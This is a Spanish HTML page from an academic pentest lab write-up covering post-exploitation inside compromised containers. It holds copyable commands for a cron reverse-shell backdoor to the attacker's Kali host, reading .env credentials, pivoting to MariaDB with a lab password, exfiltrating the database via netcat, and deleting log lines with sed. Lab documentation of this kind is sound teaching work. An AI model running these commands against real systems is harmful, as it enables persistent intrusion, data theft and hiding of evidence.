@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="es" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fase Ofensiva: Post-Explotación, Pivoteo y Exfiltración</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="../assets/css/site.css?v=1.1">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Outfit:wght@400;600;800&family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        h1, h2, h3, h4 {
+            font-family: 'Outfit', sans-serif;
+        }
+        .code-font {
+            font-family: 'Fira Code', monospace;
+        }
+    </style>
+</head>
+<body class="bg-theme-atk flex justify-center text-slate-900 leading-relaxed">
+    <script>
+        async function copyCode(button, targetId) {
+            const node = document.getElementById(targetId);
+            if (!node) return;
+            try {
+                await navigator.clipboard.writeText(node.textContent);
+                const original = button.innerHTML;
+                button.innerHTML = '✨ Copiado';
+                button.classList.add('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/30');
+                setTimeout(() => {
+                    button.innerHTML = original;
+                    button.classList.remove('bg-emerald-500/20', 'text-emerald-300', 'border-emerald-500/30');
+                }, 1600);
+            } catch (error) {
+                button.innerHTML = 'Error';
+                setTimeout(() => button.innerHTML = 'Copiar', 1600);
+            }
+        }
+    </script>
+    <main class="flex min-h-screen w-full max-w-[1440px] flex-col gap-8 px-4 py-6 md:px-8 md:py-10 lg:flex-row lg:items-start">
+        <!-- Sidebar Fijo -->
+        <aside class="lg:sticky lg:top-6 lg:h-[calc(100vh-3rem)] lg:w-80 lg:shrink-0">
+            <div class="h-full overflow-y-auto rounded-3xl border border-slate-200 bg-white/90 p-6 shadow-xl shadow-slate-200/50 backdrop-blur-md flex flex-col justify-between">
+                <div>
+                    <div class="flex items-start gap-4">
+                        <div class="flex h-12 w-12 items-center justify-center rounded-2xl bg-red-600 text-white font-bold">POST</div>
+                        <div>
+                            <p class="text-xs font-bold uppercase tracking-[0.3em] text-red-700">Fase Ofensiva</p>
+                            <h1 class="mt-1 text-2xl font-black text-slate-950">Post-Explotación</h1>
+                        </div>
+                    </div>
+
+                    <nav class="mt-8 space-y-2 text-sm">
+                        <a href="#portada" class="nav-link">Portada</a>
+                        <a href="#persistencia" class="nav-link">Persistencia (Cron)</a>
+                        <a href="#credenciales" class="nav-link">Robo de Credenciales</a>
+                        <a href="#pivoteo" class="nav-link">Pivoteo MariaDB</a>
+                        <a href="#exfiltracion" class="nav-link">Exfiltración de Datos</a>
+                        <a href="#huellas" class="nav-link">Limpieza de Huellas</a>
+                        <a href="../index.html" class="nav-link border-slate-200 bg-slate-50 text-slate-700">Volver al menú principal</a>
+                    </nav>
+                </div>
+
+                <div class="mt-8 pt-6 border-t border-slate-100 text-center text-xs text-slate-500">
+                    <p>Autor: <span class="font-semibold text-slate-800">AarónSGómez</span></p>
+                    <a href="https://asga.vercel.app" target="_blank" class="mt-1 inline-block text-red-700 hover:underline">asga.vercel.app</a>
+                </div>
+            </div>
+        </aside>
+
+        <!-- Contenedor Principal de Contenido -->
+        <section class="min-w-0 flex-1 space-y-8 pb-16">
+            <!-- Portada -->
+            <header id="portada" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 md:p-10 relative overflow-hidden">
+                <div class="absolute top-0 right-0 h-40 w-40 bg-gradient-to-br from-red-600/10 to-transparent rounded-bl-full pointer-events-none"></div>
+                <span class="inline-flex items-center gap-1.5 rounded-full bg-red-50 border border-red-200 px-3.5 py-1 text-xs font-bold text-amber-750">
+                    <span class="h-2 w-2 rounded-full bg-red-600 animate-pulse"></span> Fase de Post-Explotación y Pivoteo
+                </span>
+                <h2 class="mt-4 text-3xl font-black tracking-tight text-slate-950 md:text-5xl leading-tight">Post-Explotación, Pivoteo y Exfiltración</h2>
+                <p class="mt-4 max-w-4xl text-base text-slate-650 md:text-lg leading-relaxed">
+                    Esta sección documenta los procedimientos realizados dentro de los contenedores comprometidos tras obtener el acceso inicial. Detalla las tácticas para fijar la persistencia del canal de ataque, extraer variables de entorno, pivotar horizontalmente hacia la base de datos de producción y exfiltrar información hacia el servidor de escucha del auditor.
+                </p>
+            </header>
+
+            <!-- 1. Persistencia -->
+            <section id="persistencia" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">Persistencia y Puerta Trasera (Cronjob)</h3>
+                <p class="text-slate-650 leading-relaxed">
+                    Configuración de tareas programadas en el contenedor comprometido para garantizar que el acceso interactivo (reverse shell) se restablezca automáticamente si se pierde la sesión original.
+                </p>
+                
+                <div class="code-shell">
+                    <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                        <span>Terminal (Consola del Contenedor)</span>
+                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-persist')">Copiar</button>
+                    </div>
+                    <pre id="c-persist" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/IP_KALI/4445 0>&1'") | crontab -</code></pre>
+                </div>
+
+                <!-- Captura 17 -->
+                <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                    <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                        📸 CAPTURA 17 — Configuración de Persistencia (Crontab)
+                    </span>
+                    <p class="text-xs text-slate-600">Creación de una puerta trasera programada en el sistema.</p>
+                    <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: Listado del cronjob activo usando <code class="code-font text-red-700 bg-white px-1">crontab -l</code> y visualizando la línea que re-ejecuta la reverse shell periódicamente (<code class="code-font text-xs text-red-750">* * * * * bash -i >& /dev/tcp/...</code>).</p>
+                    <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                        [Captura 17: Crontab listing showing persistence crontab entry]
+                    </div>
+                </div>
+            </section>
+
+            <!-- 2. Robo de Credenciales -->
+            <section id="credenciales" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">Búsqueda y Robo de Credenciales de Configuración</h3>
+                <p class="text-slate-650 leading-relaxed">
+                    Inspección del sistema de archivos local para extraer las variables de entorno de la aplicación, exponiendo las contraseñas de las bases de datos internas.
+                </p>
+
+                <div class="code-shell">
+                    <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                        <span>Terminal (Consola del Contenedor)</span>
+                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-getenv')">Copiar</button>
+                    </div>
+                    <pre id="c-getenv" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>find / -name ".env" 2>/dev/null
+cat .env</code></pre>
+                </div>
+
+                <!-- Captura 16 -->
+                <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                    <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                        📸 CAPTURA 16 — Extracción de Variables de Entorno (.env)
+                    </span>
+                    <p class="text-xs text-slate-600">Búsqueda de archivos sensibles en el sistema de archivos.</p>
+                    <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: Ejecución de <code class="code-font text-red-700 bg-white px-1">cat .env</code> o <code class="code-font text-red-700 bg-white px-1">cat config.js</code> listando las credenciales de bases de datos expuestas (<code class="code-font">DB_HOST</code>, <code class="code-font">DB_USER</code>, <code class="code-font">DB_PASSWORD</code>).</p>
+                    <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                        [Captura 16: Env file credentials display db passwords]
+                    </div>
+                </div>
+            </section>
+
+            <!-- 3. Pivoteo -->
+            <section id="pivoteo" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">Movimiento Lateral y Pivoteo (Conexión MariaDB)</h3>
+                <p class="text-slate-650 leading-relaxed">
+                    Uso de las credenciales extraídas en el paso anterior para pivotar horizontalmente desde el contenedor de Next.js (`172.30.0.3` / `172.30.0.4`) hacia el motor de base de datos MariaDB (`172.30.0.5`), el cual está aislado de internet.
+                </p>
+
+                <div class="code-shell">
+                    <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                        <span>Terminal (Conexión SQL)</span>
+                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-mysql')">Copiar</button>
+                    </div>
+                    <pre id="c-mysql" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>mysql -h 172.30.0.5 -u db_modern_user -pInsecureAIPassword_123</code></pre>
+                </div>
+
+                <div class="space-y-6 mt-4">
+                    <!-- Captura 18 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 18 — Conexión e Interacción con MariaDB
+                        </span>
+                        <p class="text-xs text-slate-755">Debe mostrarse: Conexión mediante el cliente SQL en consola y la ejecución de la consulta <code class="code-font text-red-700">SHOW DATABASES;</code> mostrando las bases de datos del sistema.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 18: SQL mysql client SHOW DATABASES output]
+                        </div>
+                    </div>
+
+                    <!-- Captura 19 -->
+                    <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                        <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                            📸 CAPTURA 19 — Listado de Tablas de la BD
+                        </span>
+                        <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: Selección de la base de datos de producción y ejecución de <code class="code-font text-red-700">SHOW TABLES;</code>, exponiendo tablas críticas como <code class="code-font">users</code>.</p>
+                        <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                            [Captura 19: MySQL SHOW TABLES listing users table]
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- 4. Exfiltracion -->
+            <section id="exfiltracion" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">Exfiltración de Datos (Vía Netcat)</h3>
+                <p class="text-slate-650 leading-relaxed">
+                    Empaquetado de la base de datos de producción comprimida y transmisión perimetral directa utilizando tuberías de red (netcat) hacia la máquina de Kali Linux del auditor.
+                </p>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="code-shell">
+                        <div class="px-4 py-2.5 text-xs text-slate-600 border-b border-slate-200">En Kali Linux (Escucha)</div>
+                        <pre class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>nc -lnvp 5555 > backup_exfiltrado.tar.gz</code></pre>
+                    </div>
+                    <div class="code-shell">
+                        <div class="px-4 py-2.5 text-xs text-slate-600 border-b border-slate-200">En Contenedor Comprometido (Ataque)</div>
+                        <pre class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>tar -czf - /var/lib/mysql | nc IP_KALI 5555</code></pre>
+                    </div>
+                </div>
+
+                <!-- Captura 20 -->
+                <div class="rounded-2xl border-2 border-dashed border-red-200 bg-red-50/20 p-5 space-y-3">
+                    <span class="inline-flex items-center gap-2 rounded-xl bg-red-100 px-3 py-1 text-xs font-extrabold text-red-800">
+                        📸 CAPTURA 20 — Exfiltración de Datos de Producción
+                    </span>
+                    <p class="text-xs text-slate-700 font-semibold">Debe mostrarse: La exfiltración de registros reales del laboratorio usando la consulta <code class="code-font text-red-700">SELECT * FROM users LIMIT 5;</code> demostrando el robo de datos.</p>
+                    <div class="p-3 bg-slate-50 border rounded-xl text-center text-xs text-slate-400">
+                        [Captura 20: MySQL SELECT dump displaying real credentials of users]
+                    </div>
+                </div>
+            </section>
+
+            <!-- 5. Limpieza de Huellas -->
+            <section id="huellas" class="rounded-3xl border border-slate-200 bg-white p-8 shadow-xl shadow-slate-200/40 space-y-6">
+                <h3 class="text-2xl font-bold text-slate-950">Limpieza de Huellas (Covering Tracks)</h3>
+                <p class="text-slate-650 leading-relaxed">
+                    Eliminación del rastro dejado en los archivos de registro (logs) de Apache y Nginx del proxy inverso. Se detalla la justificación académica de por qué no se ejecutará de manera destructiva en el laboratorio de pruebas.
+                </p>
+
+                <div class="code-shell">
+                    <div class="flex items-center justify-between border-b border-slate-200 px-4 py-2.5 text-xs text-slate-600">
+                        <span>Terminal (Consola del Contenedor)</span>
+                        <button class="copy-btn rounded-lg border border-emerald-300 bg-emerald-100 px-3 py-1 text-xs text-emerald-900 font-semibold" onclick="copyCode(this, 'c-covering')">Copiar</button>
+                    </div>
+                    <pre id="c-covering" class="code-font overflow-x-auto p-4 text-xs leading-6 text-slate-900"><code>sed -i '/IP_KALI/d' /var/log/nginx/access.log</code></pre>
+                </div>
+
+                <blockquote class="border-l-4 border-amber-500 bg-red-50 p-4 text-xs text-amber-900">
+                    <strong>Justificación académica recomendada para el TFG:</strong> "La técnica de ocultación fue analizada con fines académicos y no fue ejecutada de forma destructiva sobre los logs para preservar la integridad de la evidencia forense generada por Wazuh durante el laboratorio."
+                </blockquote>
+            <!-- Barra de Navegación de Flujo Flotante (Bottom) -->
+            <footer class="flex items-center justify-between rounded-3xl border border-slate-200 bg-white p-6 shadow-xl">
+                <span class="text-xs text-slate-500 font-medium">Nota: Puedes volver atrás en cualquier momento pulsando la flecha flotante en la esquina superior derecha.</span>
+                <a href="pentest.html" class="inline-flex items-center gap-2 rounded-xl bg-red-600 px-4 py-2.5 text-sm font-bold text-white shadow-md hover:bg-amber-700 transition-colors">
+                    Siguiente: Informe de Pentest &rarr;
+                </a>
+            </footer>
+        </section>
+    </main>
+    <script src="../assets/js/sidebar.js"></script>
+    <script src="../assets/js/lightbox.js"></script>
+</body>
+</html>
